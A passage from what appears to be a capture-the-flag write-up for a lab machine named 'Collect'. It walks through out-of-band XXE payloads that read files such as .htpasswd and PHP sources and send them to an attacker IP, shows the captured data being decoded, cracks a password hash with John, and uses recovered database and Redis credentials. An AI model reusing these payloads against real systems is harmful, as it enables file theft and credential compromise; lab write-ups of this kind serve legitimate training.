<password>xxe</password>
</user>
</root>
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.58 - - [04/Dec/2022 12:25:28] "GET /foobar.dtd HTTP/1.1" 200 -
10.129.105.58 - - [04/Dec/2022 12:25:28] "GET /?f=jVZLb9swDL73V/i4AQ0U23nUunUrsMPaYmt6HxRbTYTakivJeezXj6TsxKm9rZDsiCK/TxRF0bHGeH7gU2gWhyy810qztXDbq0LIymiwiKG1AmucZQ5MziOmTWk2Sl/h7IEn0Eg/buSODoxSaDhihdyNGukcrGZ8MZ+nM04i60gZilcbUUlkmvPFlAeBeHrDC8pKoHMLHicch2wnLMtFvpWMxIF9WYP5EhoMyNjVxpSsrItRclWC+Q00GhIgjAa2Wu7R7wwaDXvkQR4gmiZHZ+IpdhJ6mCAPMLU1hyOCUuxB+suJ7Pf7SSG8wGNJsZ8maBmQxs5a5K8NegXHA70VCRDGYxsplcOES2+wP0B4lN5E9zAZPQgtNtIGAjIbopXFnEgz7DCGc7CNZmE0MN5o4THMsxj7N5SiL81m8iRrYz2uuzo6L6vokygqpT93K69ZQI6cm1mbAkMacjK820kw0vIAbks95vkvUXs6wGkL+x/AkW/FREu/N/aVsHAJpwlvNdFj0LSBq4Dm+vo6RKQ1+Qetlc6UO0m0CTzpifYpaOwHyLxzRAAJNs3484+HyJkXvxdWRs5DChBFF1RfV+HuvojSySu4og7cXjeBYsZjyOyPBsUrgIcCEU/nAI1P7j+DCg5W51trtPotvDL6A1sRO7FVE9F4o+B6Iy3UiXjOb3E+CvNRKIAXu7rEjVxct66aAxEu+WzBgzzG1FoOKax/VSF3bsClBX+SosQAfFfhwOFm52OxctuwkeyUcRQCnB5aF9pVwr0hIO5StJ278LJSbmwxCgOBIUfjZRu26u5x1d8qrh8C9v5Tcva6ljLfTgrlauGhNFsihQ9Kxlekiu5OqvOxDkC9RKsbeBMLpGmc8R8o3zaFMu9dC5YjPgktKZQxZGmS8HM0gmaIyOHXBghkZ5LyMBHhT2Oj6nRjxxKhBY8UNGnysgl7wa/YrOdJpxui7uRaCT3ZFBUBlwCcQzU0cE0wlKU4vi+9wFZUaT+G3b3LjZVFU2HRz7KMnu7efQVVdAc65Bn7Ph7dW0keQBYnC/5wXP28j1bSdqXm4uafl96p3BsbSmcSXpxtwXvWas5/VnZrcxBFQc7BIm108GQ7TY8XNqKo9EBKxMmyF8qgGSnhpWisLIl+SU+LMRvWqnr8fwA= HTTP/1.1" 200 -
```

### Decoding with CyberChef

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=alZaTGI5c3dETDczVi9pNEFRMFUyM25VdW5VcnNNUGFZbXQ2SHhSYlRZVGFraXZKZWV6WGo2VHN4S205clpEc2lDSy9UeFJGMGJIR2VIN2dVMmdXaHl5ODEwcXp0WERicTBMSXltaXdpS0cxQW11Y1pRNU16aU9tVFdrMlNsL2g3SUVuMEVnL2J1U09Eb3hTYURoaWhkeU5HdWtjckdaOE1aK25NMDRpNjBnWmlsY2JVVWxrbXZQRmxBZUJlSHJEQzhwS29ITUxIaWNjaDJ3bkxNdEZ2cFdNeElGOVdZUDVFaG9NeU5qVnhwU3NySXRSY2xXQytRMDBHaElnakFhMld1N1I3d3dhRFh2a1FSNGdtaVpIWitJcGRoSjZtQ0FQTUxVMWh5T0NVdXhCK3N1SjdQZjdTU0c4d0dOSnNaOG1hQm1ReHM1YTVLOE5lZ1hIQTcwVkNSREdZeHNwbGNPRVMyK3dQMEI0bE41RTl6QVpQUWd0TnRJR0FqSWJvcFhGbkVnejdEQ0djN0NOWm1FME1ONW80VEhNc3hqN041U2lMODFtOGlScll6MnV1em82TDZ2b2t5Z3FwVDkzSzY5WlFJNmNtMW1iQWtNYWNqSzgyMGt3MHZJQWJrczk1dmt2VVhzNndHa0wreC9Ba1cvRlJFdS9OL2FWc0hBSnB3bHZOZEZqMExTQnE0RG0rdm82UktRMStRZXRsYzZVTzBtMENUenBpZllwYU93SHlMeHpSQUFKTnMzNDg0K0h5SmtYdnhkV1JzNURDaEJGRjFSZlYrSHV2b2pTeVN1NG9nN2NYamVCWXNaanlPeVBCc1VyZ0ljQ0VVL25BSTFQN2orRENnNVc1MXRydFBvdHZETDZBMXNSTzdGVkU5RjRvK0I2SXkzVWlYak9iM0UrQ3ZOUktJQVh1N3JFalZ4Y3Q2NmFBeEV1K1d6Qmd6ekcxRm9PS2F4L1ZTRjNic0NsQlgrU29zUUFmRmZod09GbTUyT3hjdHV3a2V5VWNSUUNuQjVhRjlwVndyMGhJTzVTdEoyNzhMSlNibXd4Q2dPQklVZmpaUnUyNnU1eDFkOHFyaDhDOXY1VGN2YTZsakxmVGdybGF1R2hORnNpaFE5S3hsZWtpdTVPcXZPeERrQzlSS3NiZUJNTHBHbWM4UjhvM3phRk11OWRDNVlqUGdrdEtaUXhaR21TOEhNMGdtYUl5T0hYQmdoa1o1THlNQkhoVDJPajZuUmp4eEtoQlk4VU5HbnlzZ2w3d2EvWXJPZEpweHVpN3VSYUNUM1pGQlVCbHdDY1F6VTBjRTB3bEtVNHZpKzl3RlpVYVQrRzNiM0xqWlZGVTJIUno3S01udTdlZlFWVmRBYzY1Qm43UGg3ZFcwa2VRQlluQy81d1hQMjhqMWJTZHFYbTR1YWZsOTZwM0JzYlNtY1NYcHh0d1h2V2FzNS9WblpyY3hCRlFjN0JJbTEwOEdRN1RZOFhOcUtvOUVCS3hNbXlGOHFnR1NuaHBXaXNMSWwrU1UrTE1SdldxbnI4ZndBPQ

```c
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
avahi-autoipd:x:106:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:116:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:111:117:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:113:119:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:116:124::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:117:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
victor:x:1002:1002::/home/victor:/bin/bash
vboxadd:x:998:1::/var/run/vboxadd:/bin/false
redis:x:119:127::/var/lib/redis:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false

```

| Username |
| --- |
| victor |

## Access to developers.collect.htb

Next I searched for `.htaccess` or `htpasswd` files.

```c
$ cat htpasswd.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/developers/.htpasswd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.16/?f=%file;'>">
%eval;
%exfiltrate;
```

Modified Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 237
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://10.10.14.16/htpasswd.dtd">%xxe;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username>xxe;</username>
<password>xxe</password>
</user>
</root>
```

```c
$ python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.58 - - [04/Dec/2022 12:38:56] "GET /htpasswd.dtd HTTP/1.1" 200 -
10.129.105.58 - - [04/Dec/2022 12:38:56] "GET /?f=S0ktS83JL0gtKo5PL8ovLbBSSSwoMlTxrfJ2NK2MiFRxKXet0suqCLcMDQ7Pt9BLz3cxz4o05AIA HTTP/1.1" 200 -
```

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=UzBrdFM4M0pMMGd0S281UEw4b3ZMYkJTU1N3b01sVHhyZkoyTksyTWlGUnhLWGV0MHN1cUNMY01EUTdQdDlCTHozY3h6NG8wNUFJQQ

```c
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

### Cracking the Hash with John

```c
$ cat hash
$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

```c
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
r0cket           (?)     
1g 0:00:00:00 DONE (2022-12-04 12:40) 1.190g/s 255085p/s 255085c/s 255085C/s rasfatata..pooky12
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| developers_group | r0cket |

Now I was able to login to `http://developers.collect.htb`.

> http://developers.collect.htb/login.php

```c
$ cat loginphp.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/developers/login.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.16/?f=%file;'>">
%eval;
%exfiltrate;
```

Modified Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 237
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://10.10.14.16/loginphp.dtd">%xxe;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username>xxe;</username>
<password>xxe</password>
</user>
</root>
```

```c
$ python3 -m http.server 80                                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.58 - - [04/Dec/2022 12:45:38] "GET /loginphp.dtd HTTP/1.1" 200 -
10.129.105.58 - - [04/Dec/2022 12:45:38] "GET /?f=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 HTTP/1.1" 200 -
```

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=MVZmcmI5czJFUDhlSVA4RHEzVzFYWlNXYk1kcDZzYnUwalJGQTZSSk5ydkZpbUl3OUtBbHBwU29rcFFmR2ZLLzcwZzlMS2QyMmc3N3NpQ0p4T085K0x2ajNlbjRWUnFsKzN1Q2ZNMm9JS2pSdGozT2xWVENUZHV3MDNpNXY3ZS9SMmROS2lWUnpjZlQ4ZGw0Zkg1MStibmhaaXBxL05WQ1Q1NmdiNmhvT0VRVGtaSFcvdDdmKzNzSWZnSkttaEZ4QXlLYTFnWDNYVVY1TWtDMjFXcUJnVHR0NDNIZ29TRkt5QUxGSy9tVjBhYkZnSTlGWENyckdiSVd4SFBUZEpwSkl2UnlySVNUaE5jSFVpNGNFYngrMnVuKzF0SDBnTXdKNHlrUjB0S2FRU2tlZ2VOVFAzS0ZQa0FqVTdPajJEdG9WTHM4MWI3STV2dFA0OTh2enFkWDE1UHArZVZrZW5MNVp2cjI0dXBrTXIwOG1aeC9QSHVHT3EwQ0MxU0JjWDAxbm54dWFKOFNOeVlGR285SW5LclZydDFOMGRTRkEzQVJiQmV0N2JaUUFlUmpxV0lGUUJuZlUwRlNWNUNtTlQ2N09EdWRvS2ZvN1I5WDc1RTJLZEVpSWhEUTB2endsUUdrVW9GSEhrMkNLWWk3Y2RPU2dOMFdoemNGeUpMNG1TTE5paXlJekpoeEptY0lBZWljVnVQaEM4MlFrL0ZvUnBRZlRibDNRL3ljS1dmVG9CcFduVTN3eEtQU0M1MUszM3EyNWlzeDBueHgwSDhRTytQUU9sZHI2cmJaZUxsVnFFeHdrOStWLy9kU3ZGRkw4VWFyeE9MT1pQcXJrUlk2ZnZUbTZuVHk2Zm9NUlNwbVFEcldUOFRjSkJ4YUpMRnlKcTF1bEFzZngwUzVxRWpqb2ZWaDhoWWZXUnQ3a1ZJcDF0ZDRQclQreEI5TzhDbVBVL0RDWThSQ1BrOFVTVUR3L0d4SWdwQnNpcG9Fc2VhVUxGSXVWSTE3UVFNVkRlRlNVWjlnczNpR2FFSVZkUm1XY0R2SnNOTjJLbDNTRnpSVlNBcC9hTGs2ejZWOUkyM2xVcmFBWEd2ZlNHdDBiT2RNcFlpaWlwSFJtK3JXb2xQT0dPVEdzWjN2QUFoMmdRSzhTclV5TkMzcThXQlZENnpuK2w5Q3diTWt3RFIyUXpKQW1XRE5SdUdISVVsN3pkUk9rN0RScXNVNElqU00xQUIxSE9mWGwxdlZwbHpTUEtnK2dFUEVkaTY0a3NRRlBRa3ZYcmV6U1hvTEx2cDhYdW01SzVPcHpYakk2MGRqTkNHNDlPL0lTWmMxbFQ1blhBeVF4MEIxalR5RENCWTJ1b2NiQW1ablVTaDc3amkxTFVXV0NrUGxUK1NNaXhnQVRDRWt2aXRKalljUkJVZkhNblY5bW9TZ2ZWTTU0L3Jzak16cXh3WnozaGRhcUM0Z2RCbERUcnNuRVFIOXlKRjE5cGpmL2pBdi8xSE9IMkM3MDlsVzVoaThteFR6R2FUUTBJcHBnaVBJZVVGSUFzY2tTM1NUU1VWbks1d25BNktLeExKWVZEY2lvUE5TZ1pISnRjd3lzRi9udjY4clhlRXVTcGY0QU1sNEFNOUR4RUw5UEVKZWlCY1JpQ0tUUlNUQUxDeU4zVGU0eU8zRTdoSXZjQndnSFRLQ3RlYll3eDJuTHJiVlYvMFBRM3B0ZWhvdmNmZmd2cXlSanpxbHVNNWZhM1I2ZGFHYkV0emZ6bjFUTnRpNlQ5TXBWNEd0NEtpbHY0Y1djbjBkdDZIMWk0V2dYa1U4R0ZxNldtOTFneVpwcHBCYXBWRFJJaG9FVUV5TCtpWklUR0lQb29QbUxzdUFvS0NFYjlWUmd3S1hicVRMQ25NTlp1UUcwSDVrdkUyKzFMRmp5Mnd6MXlNTUxxTVlXbVhMc1VxYlVtQ2VzSlUxK2xEc0hOdUcvU0Y5K2JGcFVGZVhIM3U5emtGWnI0dWhMeWp0Q3NLZ1g4d0pWQlB1ZjBGRkFzSFlSV0JLU0FDRmhDZnJ6TnRZS0EyS0IvMFdVaVIvNEZDNEs5eHpISjNJdlR5bFRZRXg5QmVhRGpXTFJKeFZ6SDBnenJpZnljRXRKR2p4V21pREJrSkRYbVBobVRKMTBiaVJrd1JVcERvalhCNWpFYUpVTndiZHM0UmdWL0MySk9pL0NHdzVnM3diMk90aTU2Y0N1MWFYQjNhOXpnTzdYc09Rd24zby9sQ3NnZTVuUXNEbHhldjkvekR3M3Y4cThDWHVQeHY0a3I2OVZ1eFM1bVZLOGFTSWpzeThtS29xRmZRWWtLSUtlRk54Qzl6dk5ZTmExZG5FMlhRMFBmOG5TdmVGNHZ5SEd1Q3FmeFF3NUYwL0pnSE40cHlXZDVGSXp4K0R0ZkR6NzZMYzNRRjVqY3BuTTVpNWROU3JsbXNhTGJCalVJc0NPTFNPK2E0Z0dPemdZRW1KbGV0Snp1RExBMFpQclhpRkhUTmh3TVBBdHRHZlVvWjdEeWsyeWg5aGpONFJ3U2tNdXVZeURYUm5wcmJPZnV3ekx1RnFZUHc5TFhJZWxoNUd1QS9SNitmUTFsQXhVY1k1eXZXOUE4ZXgwREptaVphRnVYMWcyNHZGb3Izb3Ria0k3YTdqT0Rab2gwWUZJL2xydmh4YURuSlFWLzlhYUVZWnF5NzFxUjcvNE1JTDZ1SzgyKzF1YTk4Y0FMNE9JcU1PaXd4R2VRdW04SVFIVUIrZzJMeUhlOWh4RDlwOXBQL0F2SU9MeGNjWDcvcHVGM1Z6SXJ6TUQ2c2xQS09PczE3aTdod2YxcGh4TjhLZ29kL3VuOVJWYTF1M2NROGQ2UjIzaDNwQTdUZ3c5amdmWDBTSHQvclMwUFMray9iMzRxTWhmQ2pGYkoxakR6Q01hWmhBeXUycUZQbnRmcUJZYk5MMGZGT2YxR3BNNVR2b2hJa3puejN0NHJ2d0h3PT0

```c
<?php
require './bootstrap.php';

if(isset($_SESSION['auth']) && $_SESSION['auth'] == True)
{
    die(header("Location: /"));
}

$db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers");
$db->set_charset('utf8mb4');
$db->options(MYSQLI_OPT_INT_AND_FLOAT_NATIVE, 1);

if (isset($_POST['username']) && !empty($_POST['username']) && isset($_POST['password']) && !empty($_POST['password'])) {
    $stmt = $db->prepare("SELECT * FROM users where username=?");
    $stmt->bind_param("s", $_POST['username']);
    $stmt->execute();
    $result = $stmt->get_result();
    $row = $result->fetch_object();

    if ($row && $row->username == $_POST['username'] && $row->password == md5($_POST['password'])) {
        $_SESSION['username'] = $_POST['username'];
        $_SESSION['auth'] = True;

        die(header('Location: /'));
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="assets/js/tailwind.js"></script>
    <title>Developers Collect</title>
</head>

<style>
    body {
        background-image: url('assets/images/background.png');
        height: 100%;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
    }

    .logo {
        line-height: 80px;
        color: black;
        font-size: 26px;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 2px;
        float: left;
        -webkit-transition: all 0.3s ease 0s;
        -moz-transition: all 0.3s ease 0s;
        -o-transition: all 0.3s ease 0s;
        transition: all 0.3s ease 0s;
    }
</style>

<body class="min-h-screen flex justify-center items-center">
    <div class="flex min-h-full items-center justify-center py-2 px-4 sm:px-6 lg:px-8 bg-white rounded-lg">
        <div class="w-full max-w-md space-y-2 mb-10">
            <div class="flex flex-col items-center mx-24">
                <h1 class="logo">COLLECT</h1>
            </div>
            <form class="mt-8 space-y-6" action="#" method="POST">
                <input type="hidden" name="remember" value="true">
                <div class="-space-y-px rounded-md shadow-sm">
                    <div>
                        <label for="username" class="sr-only">Username</label>
                        <input id="username" name="username" type="username" required class="relative block w-full appearance-none rounded-none rounded-t-md border border-gray-300 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm" placeholder="Username">
                    </div>
                    <div>
                        <label for="password" class="sr-only">Password</label>
                        <input id="password" name="password" type="password" autocomplete="current-password" required class="relative block w-full appearance-none rounded-none rounded-b-md border border-gray-300 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm" placeholder="Password">
                    </div>
                </div>

                <div>
                    <button type="submit" class="group relative flex w-full justify-center rounded-md border border-transparent bg-indigo-600 py-2 px-4 text-sm font-medium text-white hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 transition ease-in-out delay-50">
                        <span class="absolute inset-y-0 left-0 flex items-center pl-3">
                            <!-- Heroicon name: mini/lock-closed -->
                            <svg class="h-5 w-5 text-indigo-500 group-hover:text-indigo-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                <path fill-rule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clip-rule="evenodd" />
                            </svg>
                        </span>
                        Sign in
                    </button>
                </div>
            </form>
        </div>
    </div>
</body>

</html>

```

```c
$db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers");
```

| Username | Password | Database |
| --- | --- | --- |
| webapp_user | Str0ngP4ssw0rdB*12@1 | developers |

I was wondering why it `requires` `./bootstrap.php`.

```c
<?php
require './bootstrap.php';
```

```c
$ cat bootstrapphp.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/developers/bootstrap.php">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.16/?f=%file;'>">
%eval;
%exfiltrate;
```

Modified Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 241
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://10.10.14.16/bootstrapphp.dtd">%xxe;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username>xxe;</username>
<password>xxe</password>
</user>
</root>
```

```c
$ python3 -m http.server 80       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.58 - - [04/Dec/2022 15:28:05] "GET /bootstrapphp.dtd HTTP/1.1" 200 -
10.129.105.58 - - [04/Dec/2022 15:28:05] "GET /?f=s7EvyCjg4srMy4wvTi3RUC9OLS7OzM/TK04sS43PSMxLyUktUtdRUC9KTcksVte0xqGyILEkA6SsJLnASl8/Jz85MScjv7jEyszY3FLfPrG0JMPW2d/Hx9U5JMjYxTA4wDE4GGQYF9SQ+OKSxKISDaAIAA== HTTP/1.1" 200 -
```

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=czdFdnlDamc0c3JNeTR3dlRpM1JVQzlPTFM3T3pNL1RLMDRzUzQzUFNNeEx5VWt0VXRkUlVDOUtUY2tzVnRlMHhxR3lJTEVrQTZTc0pMbkFTbDgvSno4NU1TY2p2N2pFeXN6WTNGTGZQckcwSk1QVzJkL0h4OVU1Sk1qWXhUQTR3REU0R0dRWUY5U1ErT0tTeEtJU0RhQUlBQT09

```c
<?php

ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://localhost:6379/?auth=COLLECTR3D1SPASS');

session_start();

```

| Password |
| --- |
| COLLECTR3D1SPASS |

## Redis Database Enumeration

```c
$ redis-cli -h collect.htb
collect.htb:6379> AUTH COLLECTR3D1SPASS
OK
```

```c
collect.htb:6379> INFO SERVER
# Server
redis_version:6.0.16
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:6d95e1af3a2c082a
redis_mode:standalone
os:Linux 5.10.0-19-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
